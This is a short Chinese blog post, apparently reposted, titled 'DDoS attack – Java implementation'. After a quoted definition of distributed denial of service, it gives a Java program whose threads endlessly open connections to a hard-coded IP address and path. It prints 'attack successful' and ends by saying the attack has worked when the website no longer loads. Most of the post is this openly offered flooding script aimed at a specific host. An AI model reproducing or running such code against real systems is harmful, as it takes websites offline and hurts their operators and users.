---
title: DDoS攻击-Java实现
tags:
  - Android
toc: false
abbrlink: 27312
date: 2018-08-16 14:54:00
categories:
description:
---
![](https://ws1.sinaimg.cn/large/e3bf8736ly1fypz0k52q6j22i01o01kz.jpg)

<!--more-->
### 转载

> 分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。
>

```java
public class DDos {

    public static void main(String[] args) {

        ExecutorService es = Executors.newFixedThreadPool(1000);

        Mythread mythread = new Mythread();

        Thread thread = new Thread(mythread);

        for (int i = 0; i < 10000; i++) {

            es.execute(thread);

        }

    }

}

class Mythread implements Runnable {

    public void run() {

        while (true) {

            try {

                URL url = new URL("http://221.232.148.51/guojibu/");

                URLConnection conn = url.openConnection();

                System.out.println("发包成功！");

                BufferedInputStream bis = new BufferedInputStream(

                        conn.getInputStream());

                byte[] bytes = new byte[1024];

                int len = -1;

                StringBuffer sb = new StringBuffer();


                if (bis != null) {

                    if ((len = bis.read()) != -1) {

                        sb.append(new String(bytes, 0, len));

                        System.out.println("攻击成功！");

                        bis.close();

                    }

                }

            } catch (MalformedURLException e) {

                // TODO Auto-generated catch block
                e.printStackTrace();

            } catch (IOException e) {

                // TODO Auto-generated catch block
                e.printStackTrace();

            }
        }
    }
}
```

网站打不开就是攻击成功了

 